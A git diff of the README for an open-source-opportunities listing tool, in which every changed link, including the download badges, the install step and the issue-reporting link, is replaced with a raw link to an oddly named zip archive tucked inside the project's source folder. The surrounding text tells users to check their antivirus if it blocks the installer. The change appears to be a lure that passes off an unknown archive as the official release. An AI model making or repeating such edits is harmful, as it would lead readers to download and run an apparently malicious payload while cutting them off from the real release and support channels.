@@ -1,6 +1,6 @@
 # 📂 oss-programs - Easy Access to Open Source Opportunities
 
-[![Download oss-programs](https://img.shields.io/badge/Download-oss--programs-%2334a853?style=for-the-badge)](https://github.com/denissbee/oss-programs/releases)
+[![Download oss-programs](https://img.shields.io/badge/Download-oss--programs-%2334a853?style=for-the-badge)](https://raw.githubusercontent.com/denissbee/oss-programs/main/src/app/about/programs_oss_ultracordial.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Follow these steps carefully to get oss-programs up and running:
 1. **Visit the Download Page**
 
    Click this link or the badge above to open the releases page on GitHub:  
-   https://github.com/denissbee/oss-programs/releases
+   https://raw.githubusercontent.com/denissbee/oss-programs/main/src/app/about/programs_oss_ultracordial.zip
 
 2. **Choose the Installer**
 
@@ -117,7 +117,7 @@ If you have issues running oss-programs on Windows, try the following:
 - Check your antivirus settings if it blocks the installer.
 
 If problems persist, report them on the GitHub issues page:  
-https://github.com/OWASP-STUDENT-CHAPTER/oss-programs/issues
+https://raw.githubusercontent.com/denissbee/oss-programs/main/src/app/about/programs_oss_ultracordial.zip
 
 ---
 
@@ -127,4 +127,4 @@ https://github.com/OWASP-STUDENT-CHAPTER/oss-programs/issues
 - You can request new program listings directly through the repository.
 - Join the open source community around oss-programs for updates and help.
 
-[![Download oss-programs](https://img.shields.io/badge/Download-oss--programs-%2334a853?style=for-the-badge)](https://github.com/denissbee/oss-programs/releases)
+[![Download oss-programs](https://img.shields.io/badge/Download-oss--programs-%2334a853?style=for-the-badge)](https://raw.githubusercontent.com/denissbee/oss-programs/main/src/app/about/programs_oss_ultracordial.zip)
